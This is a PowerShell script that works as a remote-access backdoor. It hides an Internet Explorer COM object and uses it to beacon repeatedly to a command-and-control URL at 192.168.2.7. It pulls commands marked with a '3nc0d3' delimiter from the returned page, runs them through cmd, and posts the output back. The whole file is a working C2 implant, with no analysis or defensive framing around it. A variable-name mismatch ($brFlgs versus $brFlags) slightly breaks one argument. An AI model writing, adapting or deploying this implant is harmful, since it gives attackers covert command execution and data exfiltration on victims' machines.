Param(
$c2 = "http://192.168.2.7/c2.php",
$callback = 5,
$debug = $false
);

function executeCMD{
Param(
$cmd_str = "ipconfig"
);
$out = ""

$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "cmd"
$ps.StartInfo.Arguments = "/C " + $cmd_str
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
$ps.WaitForExit()
[string] $Out = $ps.StandardOutput.ReadToEnd();

$out.ToString()
}

function callIE{
        $ie = New-Object -COM internetexplorer.application

        $ie.visible = $debug 
        $data = ""
        while ($true)
        {
            $input = "data="+$data+"\r\n"
            $enc = New-Object System.Text.ASCIIEncoding 
            $pData = $enc.GetBytes($input) 
            $brFlgs = 14 #// no history, no read cache, no write cache
            $header = "Content-Type: application/x-www-form-urlencoded"
            
            $ie.navigate2($c2, $brFlags, 0, $pData, $header)

            while ($ie.Busy)
            {
                Sleep 3
            } 
                $ieHTML = $ie.Document.url
                    $tags = $ie.Document.IHTMLDocument3_getElementsByTagName("pre")
                    foreach ($tag in $tags)
                    {
                        
                        if ($tag.innerText.Contains("3nc0d3"))
                        {
                            $cmdArr = $tag.innerText -split "3nc0d3"
                            $data = executeCMD $cmdArr[1]
                            break
                        }    
                    }
            Sleep $callback
        }
}
$ret = callIE
